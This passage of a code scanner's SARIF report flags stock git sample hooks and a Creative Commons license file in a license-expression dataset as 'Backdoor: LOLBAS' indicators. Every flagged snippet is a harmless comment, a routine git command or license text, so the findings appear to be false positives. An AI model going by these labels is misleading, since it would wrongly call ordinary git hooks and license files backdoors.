                      "markdown": "`#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 27,
                  "endLine": 3,
                  "endColumn": 35,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 4,
                  "endLine": 75,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 4,
                  "endLine": 70,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                    "rendered": {
                      "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                      "markdown": "`\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 18,
                  "endLine": 63,
                  "endColumn": 24,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 2,
                  "endLine": 63,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 4,
                  "endLine": 55,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                      "markdown": "`\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 4,
                  "endLine": 50,
                  "endColumn": 9,
                  "snippet": {
                    "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                    "rendered": {
                      "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                      "markdown": "`# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 39,
                  "endLine": 37,
                  "endColumn": 44,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 25,
                  "endLine": 37,
                  "endColumn": 30,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 40,
                  "endLine": 36,
                  "endColumn": 45,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 6,
                  "endLine": 36,
                  "endColumn": 11,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 21,
                  "endLine": 35,
                  "endColumn": 26,
                  "snippet": {
                    "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                    "rendered": {
                      "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                      "markdown": "`# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 58,
                  "endLine": 34,
                  "endColumn": 64,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 38,
                  "endLine": 34,
                  "endColumn": 43,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 63,
                  "endLine": 6,
                  "snippet": {
                    "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                    "rendered": {
                      "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                      "markdown": "`\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 58,
                  "endLine": 3,
                  "endColumn": 63,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 4,
                  "endLine": 39,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                    "rendered": {
                      "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                      "markdown": "`\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 18,
                  "endLine": 5,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                    "rendered": {
                      "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                      "markdown": "`\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/applypatch-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 395,
                  "startColumn": 33,
                  "endLine": 395,
                  "endColumn": 37,
                  "snippet": {
                    "text": "the avoidance of doubt, this paragraph does not form part of the\npublic licenses.\n\nCreative Commons may be contacted at creativecommons.org.\n",
                    "rendered": {
                      "text": "the avoidance of doubt, this paragraph does not form part of the\npublic licenses.\n\nCreative Commons may be contacted at creativecommons.org.\n",
                      "markdown": "`the avoidance of doubt, this paragraph does not form part of the\npublic licenses.\n\nCreative Commons may be contacted at creativecommons.org.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 385,
                  "startColumn": 62,
                  "endLine": 386,
                  "snippet": {
